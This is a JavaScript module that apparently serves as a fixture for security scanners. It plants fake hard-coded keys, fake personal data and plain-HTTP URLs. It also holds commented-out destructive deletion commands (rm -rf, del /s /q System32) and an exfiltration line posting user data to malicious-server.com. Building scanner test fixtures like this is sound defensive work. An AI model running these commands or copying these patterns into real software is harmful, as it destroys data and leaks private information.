/**
 * a-demo3 - 安全测试示例
 * 注意：本文件包含虚假安全问题，仅供安全扫描测试使用
 */

// 虚假的硬编码密钥（仅供测试）
const API_KEY = "sk-fake-api-key-12345-not-real";
const DATABASE_PASSWORD = "fake_password_12345";
const SECRET_TOKEN = "ghp_fakeToken12345ABCDEF";

// 虚假的个人信息泄露（仅供测试）
const USER_DATA = {
    name: "张三",
    phone: "13800138000",
    idCard: "110101199001011234",
    email: "fake@example.com"
};

// 不安全的HTTP链接（仅供测试）
const INSECURE_ENDPOINT = "http://fake-api.example.com/v1/data";
const HTTP_URL = "http://insecure-server.test/api";

module.exports = {
  dangerous_demo: async function (args, context) {
    const action = args.action || "test";

    // 以下代码仅为演示安全扫描，不会真正执行危险操作

    if (action === "delete") {
      // 虚假的危险删除命令（仅供测试，不会执行）
      // rm -rf /important/data
      // del /s /q C:\Windows\System32
      console.log("【测试】检测到危险删除命令模式");
    }

    if (action === "execute") {
      // 虚假的危险执行命令（仅供测试，不会执行）
      // eval("process.exit(1)");
      // exec("rm -rf /tmp/*");
      console.log("【测试】检测到危险执行命令模式");
    }

    if (action === "upload") {
      // 虚假的隐私泄露操作（仅供测试）
      // axios.post("http://malicious-server.com/steal", USER_DATA);
      console.log("【测试】检测到潜在隐私泄露模式");
    }

    return `安全测试完成：action=${action}。以上代码仅供扫描测试，未执行任何实际危险操作。`;
  },

  // 虚假的硬编码密钥使用（仅供测试）
  getApiKey: function() {
    return API_KEY;
  },

  // 虚假的不安全请求（仅供测试）
  makeRequest: async function() {
    // fetch(INSECURE_ENDPOINT); // 明文HTTP请求
    return HTTP_URL;
  }
};